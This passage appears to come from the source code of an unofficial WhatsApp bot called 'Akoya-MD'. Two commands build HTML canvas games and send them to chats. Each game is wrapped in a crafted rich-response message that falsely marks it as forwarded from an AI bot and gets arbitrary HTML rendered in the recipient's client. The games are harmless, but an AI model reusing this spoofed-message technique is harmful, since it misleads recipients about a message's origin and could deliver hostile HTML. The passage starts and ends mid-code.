        }
        break;
      case "dino":
        {
          const html = `<style>*{-webkit-tap-highlight-color:transparent;-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}</style>
<body style="margin:0;background:transparent;font-family:Arial,sans-serif;color:#eee;touch-action:manipulation;cursor:pointer">
<div style="width:100%;max-width:620px;margin:auto;padding:16px;box-sizing:border-box">
<div style="background:rgba(255,255,255,.06);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,255,255,.15);border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,.35)">
<div style="padding:18px 20px;border-bottom:1px solid rgba(255,255,255,.12);display:flex;justify-content:space-between;align-items:center">
<div><div style="font-size:11px;letter-spacing:1.5px;color:rgba(255,255,255,.45)">Akoya-MD</div><div style="font-size:21px;font-weight:bold;color:#fff">Dino Runner</div></div>
<div style="text-align:right"><div id="score" style="font-size:18px;font-weight:bold;color:#fff;text-shadow:0 0 10px rgba(108,92,231,.85);transition:transform.15s">00000</div><div id="best" style="font-size:10px;color:rgba(255,255,255,.4);margin-top:2px">BEST 00000</div></div>
</div>
<div style="padding:18px">
<canvas id="game" width="560" height="190" style="width:100%;height:auto;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.12);border-radius:12px;display:block"></canvas>
<div id="status" style="text-align:center;margin-top:10px;font-size:12px;color:rgba(255,255,255,.55)">Speed 5.0x</div>
</div></div></div>
<script>
const c=document.getElementById('game'),x=c.getContext('2d'),scoreEl=document.getElementById('score'),bestEl=document.getElementById('best'),statusEl=document.getElementById('status');
const GY=170;
let d,o,clouds,particles,ambient,trail,score,best=0,speed,gameOver,last,shake,flash,runT,spawnTimer,milestone,squash;
function loadBest(){
let vals=[];
try{let v=localStorage.getItem('dino_best');if(v)vals.push(parseInt(v,10))}catch(e){}
try{let v=sessionStorage.getItem('dino_best');if(v)vals.push(parseInt(v,10))}catch(e){}
try{let m=document.cookie.match(/(?:^|;s*)dino_best=(d+)/);if(m)vals.push(parseInt(m[1],10))}catch(e){}
return vals.length?Math.max(...vals.filter(v=>!isNaN(v))):0
}
function saveBest(v){
let val=String(Math.floor(v));
try{localStorage.setItem('dino_best',val)}catch(e){}
try{sessionStorage.setItem('dino_best',val)}catch(e){}
try{document.cookie='dino_best='+val+';max-age=31536000;path=/'}catch(e){}
try{
let rq=indexedDB.open('dino_db',1);
rq.onupgradeneeded=()=>{rq.result.createObjectStore('kv')};
rq.onsuccess=()=>{try{rq.result.transaction('kv','readwrite').objectStore('kv').put(val,'dino_best')}catch(e){}}
}catch(e){}
}
function loadBestAsync(cb){
try{
let rq=indexedDB.open('dino_db',1);
rq.onupgradeneeded=()=>{rq.result.createObjectStore('kv')};
rq.onsuccess=()=>{
try{
let gr=rq.result.transaction('kv','readonly').objectStore('kv').get('dino_best');
gr.onsuccess=()=>{if(gr.result)cb(parseInt(gr.result,10))}
}catch(e){}
}
}catch(e){}
}
best=loadBest();
loadBestAsync(v=>{if(!isNaN(v)&&v>best){best=v;bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0')}});
function reset(){
d={x:55,y:132,w:27,h:30,vy:0,jumping:false};
o=[];
clouds=[{x:120,y:32,w:44,s:.35},{x:300,y:52,w:60,s:.22},{x:460,y:26,w:36,s:.4},{x:560,y:70,w:50,s:.18}];
particles=[];
trail=[];
if(!ambient){ambient=[];for(let i=0;i<18;i++)ambient.push({x:Math.random()*c.width,y:Math.random()*c.height,r:.5+Math.random()*1.5,vx:.1+Math.random()*.3,ph:Math.random()*10})}
score=0;speed=5;gameOver=false;last=0;shake=0;flash=0;runT=0;milestone=0;squash=1;
spawnTimer=70+Math.random()*30;
bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0');
statusEl.textContent='Speed 5.0x'
}
function burst(px,py,n,col,spd){for(let i=0;i<n;i++)particles.push({x:px,y:py,vx:(Math.random()-.5)*spd,vy:-Math.random()*spd,life:1,col,size:2+Math.random()*2})}
function jumpDino(){
if(gameOver){reset();return}
if(!d.jumping){d.jumping=true;d.vy=-13;squash=.7;burst(d.x+13,d.y+30,10,'255,255,255',4)}
}
function cactus(){
let h=24+Math.random()*24;
o.push({x:c.width+20,y:GY-h,w:16+Math.random()*6,h});
if(Math.random()<.22){o.push({x:c.width+20+34+Math.random()*10,y:GY-(20+Math.random()*18),w:16,h:20+Math.random()*18})}
}
function hit(a,b){return a.x+4<b.x+b.w&&a.x+a.w-4>b.x&&a.y+4<b.y+b.h&&a.y+a.h>b.y}
function drawTrail(){
trail.forEach((p,i)=>{x.fillStyle='rgba(108,92,231,'+(.25*(i/trail.length))+')';x.fillRect(p.x,p.y,27,30)})
}
function drawDino(){
x.save();
let cx=d.x+13,cy=d.y+30;
x.translate(cx,cy);
x.scale(1/squash,squash);
x.translate(-cx,-cy);
let legOff=d.jumping?0:Math.sin(runT*.5)*5;
x.fillStyle='#eaeaea';
x.fillRect(d.x,d.y,27,30);
x.fillRect(d.x+22,d.y+5,13,18);
x.fillStyle='#6c5ce7';
x.fillRect(d.x+29,d.y+8,4,4);
x.fillStyle='#eaeaea';
x.fillRect(d.x+5,d.y+30,6,8+legOff);
x.fillRect(d.x+20,d.y+30,6,8-legOff);
x.restore()
}
function drawCactus(q){
x.save();
x.shadowColor='rgba(255,90,90,.35)';x.shadowBlur=10;
x.fillStyle='#e17a7a';
x.fillRect(q.x,q.y,q.w,q.h);
x.fillRect(q.x-7,q.y+10,7,6);
x.fillRect(q.x-7,q.y+4,6,12);
x.fillRect(q.x+q.w,q.y+18,7,6);
x.fillRect(q.x+q.w+1,q.y+12,6,12);
x.restore()
}
function drawParticles(){
particles.forEach(p=>{x.fillStyle='rgba('+p.col+','+Math.max(p.life,0)+')';x.fillRect(p.x,p.y,p.size,p.size)})
}
function drawAmbient(){
ambient.forEach(p=>{let a=.15+Math.sin(runT*.05+p.ph)*.1;x.fillStyle='rgba(180,160,255,'+a+')';x.beginPath();x.arc(p.x,p.y,p.r,0,7);x.fill()})
}
function draw(){
x.clearRect(0,0,c.width,c.height);
x.save();
if(shake>0)x.translate((Math.random()-.5)*shake,(Math.random()-.5)*shake);
drawAmbient();
x.fillStyle='rgba(255,255,255,.35)';
clouds.forEach(q=>{let b=Math.sin(runT*.03+q.x)*2;x.fillRect(q.x,q.y+b,q.w,5);x.fillRect(q.x+10,q.y+b-5,q.w*.45,10)});
x.strokeStyle='rgba(255,255,255,.25)';
x.lineWidth=2;
x.setLineDash([10,8]);
x.lineDashOffset=-runT*speed*.6;
x.beginPath();x.moveTo(0,GY);x.lineTo(c.width,GY);x.stroke();
x.setLineDash([]);
drawTrail();
drawDino();
o.forEach(drawCactus);
drawParticles();
if(flash>0){x.fillStyle='rgba(255,60,60,'+(flash*.35)+')';x.fillRect(0,0,c.width,c.height)}
x.restore();
if(gameOver){
x.fillStyle='rgba(15,15,25,.55)';x.fillRect(0,0,c.width,c.height);
x.fillStyle='#fff';x.textAlign='center';
x.font='bold 24px Arial';x.fillText('GAME OVER',c.width/2,85);
x.font='14px Arial';x.fillText('Tap layar for main again',c.width/2,112);
x.textAlign='left'
}
}
function loop(t){
if(!last)last=t;
let dt=Math.min((t-last)/16.67,2);
last=t;
runT+=dt;
if(!gameOver){
d.y+=d.vy*dt;d.vy+=.75*dt;
if(d.y>=132){
if(d.jumping){burst(d.x+13,GY,10,'255,255,255',3.5);squash=1.35}
d.y=132;d.vy=0;d.jumping=false
}
if(d.jumping)trail.push({x:d.x,y:d.y});
if(trail.length>6)trail.shift();
if(!d.jumping)trail.length=0;
squash+=(1-squash)*.18*dt;
if(!d.jumping&&Math.floor(runT)%8===0&&Math.random()<.4)burst(d.x+6,GY-2,1,'255,255,255',1.5);
ambient.forEach(p=>{p.x-=p.vx*dt;if(p.x<-4)p.x=c.width+4});
spawnTimer-=dt;
if(spawnTimer<=0){cactus();spawnTimer=Math.max(38,62-speed*1.4)+Math.random()*30}
o.forEach(q=>q.x-=speed*dt);
o=o.filter(q=>q.x>-40);
clouds.forEach(q=>{q.x-=q.s*dt;if(q.x<-80)q.x=c.width+Math.random()*100});
particles.forEach(p=>{p.x+=p.vx*dt;p.y+=p.vy*dt;p.vy+=.3*dt;p.life-=.03*dt});
particles=particles.filter(p=>p.life>0);
speed=Math.min(11,speed+.0018*dt);
score+=dt*.6;
if(score>best)best=score;
if(Math.floor(score/500)>milestone){
milestone=Math.floor(score/500);
scoreEl.style.transform='scale(1.35)';
setTimeout(()=>scoreEl.style.transform='scale(1)',150)
}
scoreEl.textContent=String(Math.floor(score)).padStart(5,'0');
bestEl.textContent='BEST '+String(Math.floor(best)).padStart(5,'0');
statusEl.textContent='Speed '+speed.toFixed(1)+'x';
for(const q of o)if(hit(d,q)){
gameOver=true;shake=14;flash=1;
saveBest(best);
burst(d.x+13,d.y+15,18,'255,90,90',5)
}
}
if(shake>0)shake=Math.max(0,shake-.6*dt);
if(flash>0)flash=Math.max(0,flash-.05*dt);
draw();
requestAnimationFrame(loop)
}
document.addEventListener('pointerdown',e=>{e.preventDefault();jumpDino()});
document.addEventListener('keydown',e=>{if(e.code==='Space'){e.preventDefault();jumpDino()}});
reset();
requestAnimationFrame(loop);
</script></body>
`;
          const data = {
            response_id: "PopiooNixelPopiooNixelPopiooNixel",
            sections: [{
              __typename: "GenAIUnifiedResponseSection",
              view_model: {
                __typename: "GenAISingleLayoutViewModel",
                primitive: {
                  __typename: "GenAIBotProgressStatusPrimitive",
                  title: "click this text",
                  is_in_progress: true
                }
              }
            }],
            embedded_screens: [{
              title: "Preview",
              content: [{
                __typename: "FOAIDNixelButtonSheets",
                tabs: [{
                  id: "tab_0",
                  tab_header: "Akoya-MD",
                  sections: [{
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: "https://example.com",
                        trusted_sources: ["example.com"]
                      }
                    }
                  }],
                  step_entries: []
                }]
              }]
            }]
          };
          await client.relayMessage(m.chat, {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                messageDisclaimerText: "",
                richResponseSourcesMetadata: {}
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify(data)).toString('base64')
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "0@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }, {
            messageId: await client.generateMessageTag()
          });
        }
        break;
      case "mbim":
        {
          const html = `<style>
* { -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none; -webkit-touch-callout: none; box-sizing: border-box; margin: 0; padding: 0; }
body { margin: 0; background: transparent; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; touch-action: none; overflow: hidden; }
.wrapper { width: 100%; max-width: 480px; margin: auto; padding: 12px; }
.card { background: linear-gradient(180deg, rgba(15,18,26,0.97), rgba(10,12,18,0.97)); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 2px solid #f59e0b; border-radius: 20px; overflow: hidden; box-shadow: 0 14px 44px rgba(0,0,0,0.75), inset 0 0 40px rgba(245,158,11,0.06); padding: 14px; position: relative; }
.header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
.title { font-size: 10px; letter-spacing: 1.5px; color: #f59e0b; font-weight: 800; text-transform: uppercase; display:flex; align-items:center; gap:6px; }
.title .dot{ width:6px; height:6px; border-radius:50%; background:#10b981; box-shadow:0 0 8px #10b981; animation: pulse 1.4s infinite; }
@keyframes pulse{ 0%,100%{opacity:1} 50%{opacity:.3} }
.score-badge { font-size: 20px; font-weight: 900; color: #10b981; text-shadow: 0 0 12px rgba(16,185,129,0.5); font-variant-numeric: tabular-nums; }
.best-badge { font-size: 10px; color: #94a3b8; font-variant-numeric: tabular-nums; }
.stat-row { display:flex; gap:8px; margin-bottom:8px; }
.stat-pill { flex:1; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; padding:5px 8px; text-align:center; }
.stat-pill .lbl{ font-size:8px; letter-spacing:1px; color:#64748b; text-transform:uppercase; font-weight:700; }
.stat-pill .val{ font-size:13px; font-weight:900; color:#fff; font-variant-numeric: tabular-nums; }
#game-container { position: relative; width: 100%; height: 350px; border-radius: 14px; overflow: hidden; border: 2px solid #1e293b; box-shadow: inset 0 0 30px rgba(0,0,0,0.6); }
canvas { width: 100%; height: 100%; display: block; background: #1a2332; }
.controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
.btn { padding: 14px; font-size: 15px; font-weight: 800; border: none; border-radius: 12px; cursor: pointer; color: #fff; text-align: center; letter-spacing: 0.5px; position: relative; overflow: hidden; }
.btn-left { background: linear-gradient(135deg, #3b82f6, #2563eb); box-shadow: 0 4px 16px rgba(59,130,246,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn-right { background: linear-gradient(135deg, #ec4899, #db2777); box-shadow: 0 4px 16px rgba(236,72,153,0.45), inset 0 1px 0 rgba(255,255,255,0.2); }
.btn:active { transform: scale(0.95); filter: brightness(0.9); }
.credit-bar { margin-top: 10px; text-align: center; font-size: 10px; font-weight: 800; letter-spacing: 1.5px; color: #94a3b8; text-transform: uppercase; border-top: 1px dashed rgba(255,255,255,0.12); padding-top: 8px; }
.credit-bar span { color: #f59e0b; text-shadow: 0 0 10px rgba(245,158,11,0.5); }
</style>
<body>
<div class="wrapper">
  <div class="card">
    <div class="header">
      <div>
        <div class="title"><span class="dot"></span>Akoya-MD</div>
        <h2 style="font-size: 17px; font-weight: 900; color: #fff; margin-top:2px;">Highway Rush 🏎️</h2>
      </div>
      <div style="text-align: right;">
        <div class="score-badge" id="score">0000</div>
        <div class="best-badge" id="best">BEST 0000</div>
      </div>
    </div>

    <div class="stat-row">
      <div class="stat-pill"><div class="lbl">Speed</div><div class="val" id="speedStat">60</div></div>
      <div class="stat-pill"><div class="lbl">Combo</div><div class="val" id="comboStat">x1</div></div>
      <div class="stat-pill"><div class="lbl">Dodged</div><div class="val" id="dodgeStat">0</div></div>
    </div>

    <div id="game-container">
      <canvas id="c"></canvas>
    </div>

    <div class="controls">
      <button class="btn btn-left" id="leftBtn">⬅️ LEFT</button>
      <button class="btn btn-right" id="rightBtn">RIGHT ➡️</button>
    </div>

    <div class="credit-bar">
      Engineered by <span>Akoya-MD</span> ⚡
    </div>
  </div>
</div>

<script>
(function() {
  var cvs = document.getElementById('c');
  var ctx = cvs.getContext('2d');
  var scoreEl = document.getElementById('score');
  var bestEl = document.getElementById('best');
  var speedStatEl = document.getElementById('speedStat');
  var comboStatEl = document.getElementById('comboStat');
  var dodgeStatEl = document.getElementById('dodgeStat');

  var W = 360;
  var H = 350;
  cvs.width = W;
  cvs.height = H;

  var ROAD_L = 26, ROAD_R = W - 26;
  var laneCount = 4;
  var laneW = (ROAD_R - ROAD_L) / laneCount;
  var lanes = [];
  for (var li = 0; li < laneCount; li++) lanes.push(ROAD_L + laneW * (li + 0.5));

  var currentLane = 1;
  var targetX = lanes[currentLane];
  var playerX = lanes[currentLane];
  var playerY = H - 72;
  var playerTilt = 0;

  var baseSpeed = 5.2;
  var speed = baseSpeed;
  var roadOffset = 0;
  var score = 0;
  var best = 0;
  var dodged = 0;
  var combo = 1;
  var comboTimer = 0;
  var shake = 0;
  var flashAlpha = 0;

  try { best = parseInt(localStorage.getItem('car_best_v2') || '0', 10) || 0; } catch(e){}
  bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');

  var traffic = [];
  var coins = [];
  var particles = [];
  var skidmarks = [];
  var clouds = [];
  var trees = [];
  var gameOver = false;
  var frame = 0;

  var CAR_PALETTES = [
    { body: '#ef4444', dark: '#991b1b', light: '#fca5a5' },
    { body: '#3b82f6', dark: '#1e3a8a', light: '#93c5fd' },
    { body: '#10b981', dark: '#065f46', light: '#6ee7b7' },
    { body: '#f59e0b', dark: '#92400e', light: '#fcd34d' },
    { body: '#8b5cf6', dark: '#4c1d95', light: '#c4b5fd' },
    { body: '#ec4899', dark: '#831843', light: '#f9a8d4' },
    { body: '#e2e8f0', dark: '#64748b', light: '#ffffff' }
  ];

  for (var tc = 0; tc < 6; tc++) {
    trees.push({ x: Math.random() * W, y: Math.random() * H, side: Math.random() < 0.5 ? 0 : 1, size: 10 + Math.random() * 8 });
  }
  for (var cc = 0; cc < 4; cc++) {
    clouds.push({ x: Math.random() * W, y: 10 + Math.random() * 60, w: 40 + Math.random() * 40, spd: 0.2 + Math.random() * 0.3 });
  }

  function spawnTraffic() {
    var occupied = {};
    for (var i = 0; i < traffic.length; i++) {
      if (traffic[i].y < 90) occupied[traffic[i].lane] = true;
    }
    var free = [];
    for (var l = 0; l < laneCount; l++) if (!occupied[l]) free.push(l);
    if (free.length === 0) return;
    var laneIdx = free[Math.floor(Math.random() * free.length)];
    var pal = CAR_PALETTES[Math.floor(Math.random() * (CAR_PALETTES.length - 1))];
    var isTruck = Math.random() < 0.18;
    traffic.push({
      lane: laneIdx,
      x: lanes[laneIdx],
      y: -70,
      w: isTruck ? 32 : 26,
      h: isTruck ? 58 : 44,
      pal: pal,
      speed: 1.8 + Math.random() * 2.2,
      truck: isTruck,
      scored: false
    });
  }

  function spawnCoin() {
    var laneIdx = Math.floor(Math.random() * laneCount);
    coins.push({ x: lanes[laneIdx], y: -30, r: 9, collected: false, spin: 0 });
  }

  function roundRect(x, y, w, h, r) {
    ctx.beginPath();
    ctx.moveTo(x + r, y);
    ctx.arcTo(x + w, y, x + w, y + h, r);
    ctx.arcTo(x + w, y + h, x, y + h, r);
    ctx.arcTo(x, y + h, x, y, r);
    ctx.arcTo(x, y, x + w, y, r);
    ctx.closePath();
  }

  function drawCar(cx, cy, w, h, pal, isPlayer, tilt) {
    ctx.save();
    ctx.translate(cx, cy);
    if (tilt) ctx.rotate(tilt);
    ctx.translate(-w / 2, -h / 2);

    ctx.save();
    ctx.fillStyle = 'rgba(0,0,0,0.35)';
    ctx.beginPath();
    ctx.ellipse(w / 2, h - 2, w * 0.6, 7, 0, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();

    ctx.fillStyle = '#0b0f17';
    var wheelY = [7, h - 16];
    for (var wi = 0; wi < 2; wi++) {
      roundRect(-3, wheelY[wi], 4, 12, 2); ctx.fill();
      roundRect(w - 1, wheelY[wi], 4, 12, 2); ctx.fill();
    }

    var grad = ctx.createLinearGradient(0, 0, w, 0);
    grad.addColorStop(0, pal.dark);
    grad.addColorStop(0.5, pal.body);
    grad.addColorStop(1, pal.light);
    ctx.fillStyle = grad;
    roundRect(0, 0, w, h, 6);
    ctx.fill();

    var roofY = isPlayer ? 8 : 11;
    var roofH = h * 0.33;
    ctx.fillStyle = '#0b0f17';
    roundRect(3, roofY, w - 6, roofH, 4);
    ctx.fill();

    ctx.fillStyle = '#93c5fd';
    roundRect(5, roofY + 2, w - 10, roofH - 4, 3);
    ctx.fill();

    if (isPlayer) {
      ctx.fillStyle = '#fff7c2';
      ctx.fillRect(2, 1, 5, 3);
      ctx.fillRect(w - 7, 1, 5, 3);
    } else {
      ctx.fillStyle = '#ff3b3b';
      ctx.fillRect(2, h - 4, 5, 3);
      ctx.fillRect(w - 7, h - 4, 5, 3);
    }

    ctx.restore();
  }

  function explode(x, y, color) {
    for (var i = 0; i < 30; i++) {
      var angle = Math.random() * Math.PI * 2;
      var spd = 2 + Math.random() * 6;
      particles.push({ x: x, y: y, vx: Math.cos(angle) * spd, vy: Math.sin(angle) * spd, color: color, life: 1, size: 2 + Math.random() * 3 });
    }
    shake = 10;
    flashAlpha = 0.45;
  }

  var spawnCounter = 0;
  var coinCounter = 0;

  function drawBackground() {
    ctx.fillStyle = '#1e293b';
    ctx.fillRect(0, 0, W, H);

    ctx.fillStyle = '#0d7a4f';
    ctx.fillRect(0, 0, ROAD_L, H);
    ctx.fillRect(ROAD_R, 0, W - ROAD_R, H);

    for (var ti = 0; ti < trees.length; ti++) {
      var tr = trees[ti];
      if (!gameOver) tr.y += speed * 0.9;
      if (tr.y > H + 20) { tr.y = -20; tr.x = tr.side === 0 ? Math.random() * (ROAD_L - 8) + 2 : ROAD_R + Math.random() * (W - ROAD_R - 8) + 2; }
      ctx.fillStyle = '#064e3b';
      ctx.beginPath();
      ctx.arc(tr.x, tr.y, tr.size, 0, Math.PI * 2);
      ctx.fill();
    }

    ctx.fillStyle = '#263143';
    ctx.fillRect(ROAD_L, 0, ROAD_R - ROAD_L, H);

    ctx.fillStyle = '#fde68a';
    ctx.fillRect(ROAD_L, 0, 3, H);
    ctx.fillRect(ROAD_R - 3, 0, 3, H);

    if (!gameOver) roadOffset = (roadOffset + speed) % 44;
    ctx.fillStyle = 'rgba(226,232,240,0.85)';
    for (var l = 1; l < laneCount; l++) {
      var lx = ROAD_L + laneW * l;
      for (var y = -44 + roadOffset; y < H; y += 44) {
        ctx.fillRect(lx - 2, y, 4, 22);
      }
    }
  }

  function update() {
    frame++;
    ctx.save();
    if (shake > 0) {
      var sx = (Math.random() - 0.5) * shake;
      var sy = (Math.random() - 0.5) * shake;
      ctx.translate(sx, sy);
      shake *= 0.88;
      if (shake < 0.5) shake = 0;
    }

    ctx.clearRect(-10, -10, W + 20, H + 20);
    drawBackground();

    if (!gameOver) {
      score += 1 + Math.floor(combo / 2);
      scoreEl.textContent = String(score).padStart(4, '0');
      if (score > best) {
        best = score;
        try { localStorage.setItem('car_best_v2', String(best)); } catch(e){}
        bestEl.textContent = 'BEST ' + String(best).padStart(4, '0');
      }

      speed = baseSpeed + Math.min(score / 450, 4.0);
      speedStatEl.textContent = Math.round(speed * 18);
      dodgeStatEl.textContent = dodged;
      comboStatEl.textContent = 'x' + combo;

      if (comboTimer > 0) {
        comboTimer--;
      } else if (combo > 1) {
        combo = 1;
      }

      playerX += (targetX - playerX) * 0.25;
      playerTilt = (targetX - playerX) * 0.004;

      spawnCounter++;
      var spawnGap = Math.max(24, 44 - Math.floor(score / 160));
      if (spawnCounter > spawnGap) { spawnTraffic(); spawnCounter = 0; }

      coinCounter++;
      if (coinCounter > 65) { spawnCoin(); coinCounter = 0; }
    }

    for (var c = coins.length - 1; c >= 0; c--) {
      var coin = coins[c];
      if (!gameOver) { coin.y += speed; coin.spin += 0.15; }
      var squash = Math.abs(Math.cos(coin.spin));
      ctx.save();
      ctx.translate(coin.x, coin.y);
      ctx.scale(Math.max(0.2, squash), 1);
      ctx.fillStyle = '#fbbf24';
      ctx.beginPath();
      ctx.arc(0, 0, coin.r, 0, Math.PI * 2);
      ctx.fill();
      ctx.restore();

      var cdx = Math.abs(playerX - coin.x);
      var cdy = Math.abs(playerY + 20 - coin.y);
      if (cdx < 20 && cdy < 24 && !coin.collected && !gameOver) {
        coin.collected = true;
        score += 40 * combo;
        combo = Math.min(combo + 1, 9);
        comboTimer = 90;
        explode(coin.x, coin.y, '#fbbf24');
        coins.splice(c, 1);
      } else if (coin.y > H + 20) {
        coins.splice(c, 1);
      }
    }

    for (var i = traffic.length - 1; i >= 0; i--) {
      var t = traffic[i];
      if (!gameOver) {
        t.y += (speed - t.speed);
        if (t.y - t.h / 2 > playerY + 10 && !t.scored) {
          t.scored = true;
          dodged++;
        }
      }
      drawCar(t.x, t.y, t.w, t.h, t.pal, false, 0);

      var dx = Math.abs(playerX - t.x);
      var dy = Math.abs(playerY - t.y);
      if (dx < (t.w + 22) / 2 - 4 && dy < (t.h + 40) / 2 - 6 && !gameOver) {
        gameOver = true;
        explode(playerX, playerY + 20, '#f59e0b');
        explode(t.x, t.y + 20, t.pal.body);
      }

      if (t.y > H + 80) traffic.splice(i, 1);
    }

    if (!gameOver) {
      drawCar(playerX, playerY, 26, 44, { body: '#f59e0b', dark: '#92400e', light: '#fde68a' }, true, playerTilt);
    }

    for (var p = particles.length - 1; p >= 0; p--) {
      var pt = particles[p];
      pt.x += pt.vx;
      pt.y += pt.vy;
      pt.life -= 0.04;
      if (pt.life <= 0) { particles.splice(p, 1); continue; }
      ctx.globalAlpha = Math.max(pt.life, 0);
      ctx.fillStyle = pt.color;
      ctx.beginPath();
      ctx.arc(pt.x, pt.y, pt.size || 3, 0, Math.PI * 2);
      ctx.fill();
      ctx.globalAlpha = 1;
    }

    if (flashAlpha > 0.01) {
      ctx.fillStyle = 'rgba(255,255,255,' + flashAlpha + ')';
      ctx.fillRect(0, 0, W, H);
      flashAlpha *= 0.85;
    }

    if (gameOver) {
      ctx.fillStyle = 'rgba(10, 12, 20, 0.85)';
      ctx.fillRect(0, 0, W, H);

      ctx.textAlign = 'center';
      ctx.fillStyle = '#ef4444';
      ctx.font = '900 24px sans-serif';
      ctx.fillText('CRASHED 💥', W / 2, H / 2 - 25);

      ctx.fillStyle = '#ffffff';
      ctx.font = '800 14px sans-serif';
      ctx.fillText('Score: ' + score, W / 2, H / 2 - 2);
      ctx.fillStyle = '#94a3b8';
      ctx.font = '600 11px sans-serif';
      ctx.fillText('Best: ' + best + '  •  Dodged: ' + dodged, W / 2, H / 2 + 18);

      ctx.fillStyle = '#fbbf24';
      ctx.font = '700 12px sans-serif';
      ctx.fillText('TAP TO RESTART', W / 2, H / 2 + 42);
    }

    ctx.restore();
    requestAnimationFrame(update);
  }

  function moveLeft() {
    if (gameOver) return;
    if (currentLane > 0) currentLane--;
    targetX = lanes[currentLane];
  }

  function moveRight() {
    if (gameOver) return;
    if (currentLane < lanes.length - 1) currentLane++;
    targetX = lanes[currentLane];
  }

  function restart() {
    score = 0;
    dodged = 0;
    combo = 1;
    comboTimer = 0;
    scoreEl.textContent = '0000';
    traffic = [];
    coins = [];
    particles = [];
    currentLane = 1;
    targetX = lanes[currentLane];
    playerX = lanes[currentLane];
    speed = baseSpeed;
    gameOver = false;
  }

  function addTapEvent(id, fn) {
    var el = document.getElementById(id);
    if (!el) return;
    el.addEventListener('pointerdown', function(e) { e.preventDefault(); fn(); });
  }

  addTapEvent('leftBtn', moveLeft);
  addTapEvent('rightBtn', moveRight);

  function handleCanvasTap(e) {
    e.preventDefault();
    if (gameOver) { restart(); return; }
    var rect = cvs.getBoundingClientRect();
    var clientX = e.clientX;
    if (e.touches && e.touches.length > 0) clientX = e.touches[0].clientX;
    var clickX = (clientX - rect.left) * (W / rect.width);
    if (clickX < W / 2) moveLeft(); else moveRight();
  }

  cvs.addEventListener('pointerdown', handleCanvasTap);

  update();
})();
</script>
</body>
</html>`;
          const data = {
            response_id: "PopiooNixelPopiooNixelPopiooNixel",
            sections: [{
              __typename: "GenAIUnifiedResponseSection",
              view_model: {
                __typename: "GenAISingleLayoutViewModel",
                primitive: {
                  __typename: "GenAIBotProgressStatusPrimitive",
                  title: "click this text",
                  is_in_progress: true
                }
              }
            }],
            embedded_screens: [{
              title: "Preview",
              content: [{
                __typename: "FOAIDNixelButtonSheets",
                tabs: [{
                  id: "tab_0",
                  tab_header: "Akoya-MD",
                  sections: [{
                    __typename: "GenAIUnifiedResponseSection",
                    view_model: {
                      __typename: "GenAISingleLayoutViewModel",
                      primitive: {
                        __typename: "GenAIaeacdsnwHtmlPrimitive",
                        payload: html,
                        url: "https://example.com",
                        trusted_sources: ["example.com"]
                      }
                    }
                  }],
                  step_entries: []
                }]
              }]
            }]
          };
          await client.relayMessage(m.chat, {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              botMetadata: {
                messageDisclaimerText: "",
                richResponseSourcesMetadata: {}
              }
            },
            botForwardedMessage: {
              message: {
                richResponseMessage: {
                  messageType: 1,
                  unifiedResponse: {
                    data: Buffer.from(JSON.stringify(data)).toString('base64')
                  },
                  contextInfo: {
                    forwardingScore: 1,
                    isForwarded: true,
                    forwardedAiBotMessageInfo: {
                      botJid: "0@bot"
                    },
                    forwardOrigin: 4
                  }
                }
              }
            }
          }, {
            messageId: await client.generateMessageTag()
          });
        }
        break;

      /// ───────────── [ 𝖦𝖺𝗆𝖾 𝖱𝗂𝖼𝗁 (𝖡𝖾𝗋𝗄𝖾𝗅𝖺𝗇𝗃𝗎𝗍𝖺𝗇) ] ──────────── ///
      case "tebakbom":
        {
          const html = String.raw`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Whisper · Guess Boom vs client</title>
<style>
 * {
 box-sizing: border-box;
 user-select: none;
 -webkit-tap-highlight-color: transparent;
 }

 html, body { height: 100%; margin: 0; }

 body {
 background: #0d0f1a;
 display: flex;
 justify-content: center;
 align-items: flex-start;
 font-family: 'Courier New', Courier, monospace;
 touch-action: manipulation;
 padding: 4px;
 }

.game-wrapper {
 background: #1a1f2f;
 padding: 1.4rem 0.8rem 0.8rem;
 border-radius: 1.6rem;
 box-shadow: 0 10px 20px rgba(0, 0, 0, 0.7), inset 0 0 0 2px #3a4a6a;
 border: 3px solid #2a3a5a;
 max-width: 380px;
 width: 100%;
 position: relative;
 margin-top: 10px;
 }

.game-wrapper::before {
 content: '💥 G U E S S B O O M';
 position: absolute;
 top: -11px;
 left: 50%;
 transform: translateX(-50%);
 background: #1a1f2f;
 color: #b0c8ff;
 padding: 2px 10px;
 font-size: 0.55rem;
 letter-spacing: 3px;
 border-radius: 30px;
 border: 2px solid #4a6a8a;
 text-shadow: 0 0 10px #6f8fcf;
 font-weight: bold;
 white-space: nowrap;
 }

.level-bar {
 display: grid;
 grid-template-columns: repeat(4, 1fr);
 gap: 5px;
 margin-bottom: 0.6rem;
 }

.level-btn {
 background: #0f1524;
 color: #6a7a9a;
